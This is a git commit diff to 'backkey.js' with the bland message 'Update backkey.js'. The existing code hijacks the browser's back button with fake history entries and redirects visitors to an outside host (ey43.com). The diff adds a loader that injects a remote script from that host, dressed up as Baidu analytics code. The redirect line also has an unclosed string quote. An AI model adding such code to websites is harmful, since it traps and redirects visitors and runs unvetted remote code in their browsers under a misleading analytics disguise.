012d2736b0fadea82547a40dca586e010c40fa85
lagalfredben <lagalfredben@gmail.com>
2025-12-13 01:08:04 +0100

    Update backkey.js

--- backkey.js
+++ backkey.js
@@ -1,4 +1,4 @@
-	    window.onhashchange=function(){jp();};
+    window.onhashchange=function(){jp();};
     function hh() {history.pushState(history.length+1, "message", "#"+new Date().getTime());}
     function jp() {
         fh();}
@@ -9,3 +9,12 @@
     function goon(){
         location.href="https://ey43.com/4/9148867;
     }
+</script>
+<script>
+    var _hmt = _hmt || [];
+    (function() {
+        var hm = document.createElement("script");
+        hm.src = "https://ey43.com/4/9148867";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+    })();
